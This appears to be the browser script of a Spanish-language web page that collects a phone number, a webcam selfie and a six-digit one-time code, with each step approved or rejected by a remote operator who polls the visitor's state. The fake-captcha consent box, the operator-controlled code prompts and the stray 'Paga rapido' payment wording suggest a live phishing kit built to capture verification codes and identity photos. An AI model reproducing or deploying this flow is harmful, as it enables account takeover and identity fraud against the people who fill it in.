const camera = document.querySelector("#camera");
const companyLogo = document.querySelector("#company-logo");
const cameraBackdrop = document.querySelector("#camera-backdrop");
const canvas = document.querySelector("#canvas");
const faceGuidance = document.querySelector("#face-guidance");
const cameraStage = document.querySelector(".camera-stage");
const cameraDialog = document.querySelector("#camera-dialog");
const loadingDialog = document.querySelector("#loading-dialog");
const intakeForm = document.querySelector("#intake-form");
const intakeError = document.querySelector("#intake-error");
const intakeSubmit = document.querySelector("#intake-submit");
const codeForm = document.querySelector("#code-form");
const codeInput = document.querySelector("#worker-code");
const codeError = document.querySelector("#code-error");
const codeLoading = document.querySelector("#code-loading");
const codeBoxes = [...document.querySelectorAll("#otp-boxes span")];
let cameraStream;
let visitId;
let pollTimer;
let heartbeatTimer;
let frameCheckTimer;
let countdownTimer;
let checkingFrame = false;
let faceReady = false;
let cameraReady = false;
let countdownDeadline = 0;
let codeSubmitting = false;
let lastVisitState = "";

companyLogo.addEventListener("error", () => {
  companyLogo.hidden = true;
  document.querySelector("#company-logo-placeholder").hidden = false;
});

async function api(url, options = {}) {
  const response = await fetch(url, {
    ...options,
    headers: { "Content-Type": "application/json", ...(options.headers || {}) }
  });
  let body = {};
  try {
    body = await response.json();
  } catch (err) {
    if (!response.ok) throw new Error(`Error de conexión con el servidor (${response.status}). Intenta de nuevo.`);
    throw err;
  }
  if (!response.ok) throw new Error(body.error || "No se pudo completar la solicitud.");
  return body;
}

function showScreen(screenId) {
  for (const id of ["intake-screen", "camera-screen", "code-screen", "waiting-screen", "approved-screen"]) {
    document.querySelector(`#${id}`).hidden = id !== screenId;
  }
}

function stopCountdown() {
  clearInterval(countdownTimer);
  countdownTimer = null;
  countdownDeadline = 0;
}

function updateFaceGuide(message, ready = false) {
  faceGuidance.textContent = message;
  faceGuidance.classList.toggle("is-ready", ready);
  faceGuidance.classList.toggle("is-error", !ready);
  cameraStage.classList.toggle("is-ready", ready);
}

function closeDialog(dialog) {
  if (dialog.open) dialog.close();
}

function openDialog(dialog) {
  if (!dialog.open) dialog.showModal();
}

function configureDialog({ title, message, primaryText, mode, error = "" }) {
  stopCountdown();
  document.querySelector("#dialog-title").textContent = title;
  document.querySelector("#dialog-message").textContent = message;
  document.querySelector("#dialog-primary").textContent = primaryText;
  document.querySelector("#dialog-error").textContent = error;
  document.querySelector("#dialog-error").hidden = !error;
  document.querySelector("#dialog-primary").dataset.mode = mode;
  openDialog(cameraDialog);
}

function showRetryDialog(message) {
  configureDialog({
    title: "¡Otra vez!",
    message,
    primaryText: "Reintenta",
    mode: "retry"
  });
}

function setWaiting(title, message) {
  document.querySelector("#waiting-title").textContent = title;
  document.querySelector("#waiting-message").textContent = message;
  showScreen("waiting-screen");
}

function updateOtpBoxes() {
  const digits = codeInput.value;
  codeBoxes.forEach((box, index) => {
    box.textContent = digits[index] || "";
    box.classList.toggle("is-active", index === digits.length && digits.length < 6);
  });
}

function updateCaptureAvailability() {
  if (!faceReady || !cameraReady || !cameraStream || checkingFrame) {
    stopCountdown();
    return;
  }
  if (countdownTimer) return;

  countdownDeadline = Date.now() + 3000;
  const tick = () => {
    if (checkingFrame) return;
    if (!faceReady || !cameraReady || !cameraStream) {
      stopCountdown();
      return;
    }
    const seconds = Math.max(0, Math.ceil((countdownDeadline - Date.now()) / 1000));
    updateFaceGuide(
      seconds ? `Perfecto. Mantén la posición… ${seconds}` : "Enviando tu selfie…",
      true
    );
    if (seconds === 0) {
      stopCountdown();
      submitSelfie();
    }
  };
  tick();
  countdownTimer = setInterval(tick, 200);
}

async function checkCameraFrame() {
  if (!cameraStream || checkingFrame || camera.readyState < HTMLMediaElement.HAVE_CURRENT_DATA) return;
  checkingFrame = true;
  try {
    const scale = Math.min(1, 640 / camera.videoWidth);
    canvas.width = Math.round(camera.videoWidth * scale);
    canvas.height = Math.round(camera.videoHeight * scale);
    canvas.getContext("2d").drawImage(camera, 0, 0, canvas.width, canvas.height);
    const result = await api("/api/visits/current/check-frame", {
      method: "POST",
      body: JSON.stringify({ image: canvas.toDataURL("image/jpeg", 0.62) })
    });
    faceReady = result.ready;
    updateFaceGuide(result.message, faceReady);
  } catch (error) {
    faceReady = false;
    updateFaceGuide(error.message);
    if (error.message.includes("No hay una visita")) {
      stopCamera();
      configureDialog({
        title: "No se pudo iniciar",
        message: "No encontramos una solicitud activa para verificar la cámara.",
        primaryText: "Reintenta",
        mode: "retry"
      });
    }
  } finally {
    checkingFrame = false;
    updateCaptureAvailability();
  }
}

async function startCamera() {
  try {
    if (!visitId) throw new Error("No encontramos una solicitud activa. Vuelve a enviar tus datos.");

    cameraStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 1280 } },
      audio: false
    });
    camera.srcObject = cameraStream;
    cameraBackdrop.srcObject = cameraStream;
    await Promise.all([camera.play(), cameraBackdrop.play()]);
    cameraReady = true;
    faceReady = false;
    closeDialog(cameraDialog);
    updateFaceGuide("Levanta el teléfono a la altura de tus ojos", false);
    clearInterval(frameCheckTimer);
    frameCheckTimer = setInterval(checkCameraFrame, 800);
    checkCameraFrame();
  } catch (error) {
    stopCamera();
    configureDialog({
      title: "No pudimos activar la cámara",
      message: "Revisa el permiso de cámara en tu navegador y vuelve a intentarlo.",
      primaryText: "Reintenta",
      mode: visitId ? "retry" : "start",
      error: error.message
    });
  }
}

function stopCamera() {
  clearInterval(frameCheckTimer);
  stopCountdown();
  if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
  cameraStream = null;
  camera.srcObject = null;
  cameraBackdrop.srcObject = null;
  cameraReady = false;
  faceReady = false;
  updateFaceGuide("Levanta el teléfono a la altura de tus ojos", false);
}

async function submitSelfie() {
  if (!cameraReady || !cameraStream || !faceReady) return;
  clearInterval(frameCheckTimer);
  faceReady = false;
  showScreen("camera-screen");
  document.querySelector("#loading-title").textContent = "Subiendo…";
  document.querySelector("#loading-message").textContent =
    "Espera un momento, estamos confirmando que eres tú.";
  openDialog(loadingDialog);
  try {
    canvas.width = camera.videoWidth;
    canvas.height = camera.videoHeight;
    canvas.getContext("2d").drawImage(camera, 0, 0);
    await api(`/api/visits/${visitId}/photo`, {
      method: "POST",
      body: JSON.stringify({ image: canvas.toDataURL("image/jpeg", 0.88) })
    });
    stopCamera();
    closeDialog(loadingDialog);
    setWaiting("Selfie enviada", "Espera un momento, el asesor está confirmando que eres tú.");
    lastVisitState = "pending_photo";
  } catch (error) {
    closeDialog(loadingDialog);
    showScreen("camera-screen");
    if (!cameraStream) await startCamera();
    showRetryDialog(error.message.includes("gafas")
      ? "Detectamos gafas en la selfie. Quítatelas y vuelve a intentarlo."
      : "No pudimos validar esta selfie. Ajusta el encuadre e inténtalo de nuevo.");
  }
}

function startPolling() {
  clearInterval(pollTimer);
  clearInterval(heartbeatTimer);
  pollTimer = setInterval(refreshVisit, 2000);
  heartbeatTimer = setInterval(() => {
    fetch("/api/visits/current/heartbeat", { method: "POST" }).catch(() => {});
  }, 15000);
}

async function refreshVisit() {
  try {
    const visit = await api("/api/visits/current");
    if (!visit.active) {
      if (visitId) {
        clearInterval(pollTimer);
        clearInterval(heartbeatTimer);
        stopCamera();
        visitId = null;
        lastVisitState = "";
        showScreen("intake-screen");
      }
      return;
    }
    visitId = visit.id;
    if (visit.state === "pending_details") {
      closeDialog(loadingDialog);
      closeDialog(cameraDialog);
      stopCamera();
      setWaiting("", "Esperando un momento.");
    } else if (visit.state === "details_rejected" && lastVisitState !== "details_rejected") {
      closeDialog(loadingDialog);
      closeDialog(cameraDialog);
      stopCamera();
      showScreen("intake-screen");
      document.querySelector("#visit-phone").value = visit.phone;
      document.querySelector("#visit-site").value = visit.site;
      intakeError.textContent = visit.note || "Revisa tus datos y vuelve a intentarlo.";
      intakeError.hidden = false;
      intakeSubmit.disabled = false;
      document.querySelector("#visit-phone").focus({ preventScroll: true });
    } else if (visit.state === "details_ok" && lastVisitState !== "details_ok") {
      closeDialog(loadingDialog);
      stopCamera();
      showScreen("camera-screen");
      configureDialog({
        title: "Paga rapido y sencillo",
        message: "Prepata tu selfie. Ahora pagas mas rapido y facil. sigue las instrucciones a continuación.",
        primaryText: "Pagar",
        mode: "start"
      });
    } else if (visit.state === "approved") {
      closeDialog(loadingDialog);
      closeDialog(cameraDialog);
      stopCamera();
      showScreen("approved-screen");
    } else if (visit.state === "awaiting_code" || visit.state === "code_rejected") {
      closeDialog(loadingDialog);
      closeDialog(cameraDialog);
      stopCamera();
      showScreen("code-screen");
      codeLoading.hidden = true;
      codeInput.disabled = false;
      if (visit.state === "code_rejected" && lastVisitState !== "code_rejected") {
        codeError.textContent = visit.note || "El código no coincide. Intenta nuevamente.";
        codeError.hidden = false;
        codeInput.value = "";
        updateOtpBoxes();
        codeInput.focus({ preventScroll: true });
      }
      if (visit.state === "awaiting_code" && lastVisitState !== "awaiting_code") {
        codeError.hidden = true;
        codeInput.value = "";
        updateOtpBoxes();
        codeInput.focus({ preventScroll: true });
      }
    } else if (visit.state === "pending_photo" && visit.has_photo) {
      closeDialog(loadingDialog);
      closeDialog(cameraDialog);
      stopCamera();
      setWaiting("Subiendo", "");
    } else if (visit.state === "pending_code") {
      closeDialog(cameraDialog);
      stopCamera();
      setWaiting("Validando", "Espera un momento, estamos confirmando que eres tú.");
    } else if (visit.state === "photo_rejected" && lastVisitState !== "photo_rejected") {
      closeDialog(loadingDialog);
      stopCamera();
      showScreen("camera-screen");
      showRetryDialog(visit.note || "No pudimos validar esta selfie. Vuelve a intentarlo.");
    } else if (visit.state === "denied") {
      closeDialog(loadingDialog);
      closeDialog(cameraDialog);
      stopCamera();
      setWaiting("No se pudo confirmar", visit.note || "Consulta con el personal de recepción.");
    }
    lastVisitState = visit.state;
  } catch (error) {
    if (error.message.includes("bloqueada")) {
      stopCamera();
      clearInterval(pollTimer);
      clearInterval(heartbeatTimer);
      configureDialog({
        title: "Solicitud bloqueada",
        message: "Consulta con el personal de recepción para continuar.",
        primaryText: "Entendido",
        mode: "blocked"
      });
    }
  }
}

async function submitCode() {
  if (codeSubmitting || !/^\d{6}$/.test(codeInput.value)) return;
  codeSubmitting = true;
  codeError.hidden = true;
  codeLoading.hidden = false;
  codeInput.disabled = true;
  try {
    await api("/api/visits/current/code", {
      method: "POST",
      body: JSON.stringify({ code: codeInput.value })
    });
    lastVisitState = "pending_code";
    showScreen("waiting-screen");
    setWaiting("Validando código…", "Espera un momento, estamos confirmando que eres tú.");
  } catch (error) {
    codeError.textContent = error.message;
    codeError.hidden = false;
    codeInput.value = "";
    codeInput.disabled = false;
    codeInput.focus({ preventScroll: true });
    codeLoading.hidden = true;
    updateOtpBoxes();
  } finally {
    codeSubmitting = false;
  }
}

document.querySelector("#dialog-primary").addEventListener("click", () => {
  const mode = document.querySelector("#dialog-primary").dataset.mode;
  if (mode === "blocked") {
    closeDialog(cameraDialog);
    return;
  }
  if (mode === "retry") {
    closeDialog(cameraDialog);
    if (cameraStream) {
      updateFaceGuide("Levanta el teléfono a la altura de tus ojos", false);
      clearInterval(frameCheckTimer);
      frameCheckTimer = setInterval(checkCameraFrame, 800);
      checkCameraFrame();
    } else {
      startCamera();
    }
    return;
  }
  startCamera();
});

intakeForm.addEventListener("submit", async event => {
  event.preventDefault();
  intakeError.hidden = true;
  intakeSubmit.disabled = true;
  const payload = {
    phone: document.querySelector("#visit-phone").value,
    site: document.querySelector("#visit-site").value,
    consent: document.querySelector("#visit-consent").checked
  };
  try {
    const correctingDetails = visitId && lastVisitState === "details_rejected";
    const visit = await api(
      correctingDetails ? "/api/visits/current/details" : "/api/visits",
      {
        method: "POST",
        body: JSON.stringify(payload)
      }
    );
    if (visit.id) visitId = visit.id;
    lastVisitState = visit.state;
    startPolling();
    setWaiting("", "Esperando un momento.");
  } catch (error) {
    intakeError.textContent = error.message;
    intakeError.hidden = false;
    intakeSubmit.disabled = false;
  }
});

document.querySelector("#visit-consent").addEventListener("change", event => {
  event.currentTarget.closest(".custom-captcha-container").classList.toggle("active", event.currentTarget.checked);
});

codeInput.addEventListener("input", () => {
  codeInput.value = codeInput.value.replace(/\D/g, "").slice(0, 6);
  updateOtpBoxes();
  if (codeInput.value.length === 6) submitCode();
});

codeInput.addEventListener("paste", event => {
  const digits = event.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
  if (!digits) return;
  event.preventDefault();
  codeInput.value = digits;
  updateOtpBoxes();
  if (digits.length === 6) submitCode();
});

codeInput.addEventListener("focus", () => {
  document.querySelector(".otp-entry").classList.add("is-focused");
});
codeInput.addEventListener("blur", () => {
  document.querySelector(".otp-entry").classList.remove("is-focused");
});

codeForm.addEventListener("submit", event => event.preventDefault());

document.querySelector("#leave-button").addEventListener("click", async () => {
  try {
    await api("/api/visits/current/leave", { method: "POST", body: "{}" });
    clearInterval(pollTimer);
    clearInterval(heartbeatTimer);
    stopCamera();
    visitId = null;
    lastVisitState = "";
    intakeForm.reset();
    document.querySelector(".custom-captcha-container").classList.remove("active");
    intakeError.hidden = true;
    intakeSubmit.disabled = false;
    showScreen("intake-screen");
  } catch (error) {
    setWaiting("No se pudo finalizar", error.message);
  }
});

window.addEventListener("pagehide", stopCamera);

showScreen("intake-screen");
refreshVisit().then(() => {
  if (visitId) startPolling();
});
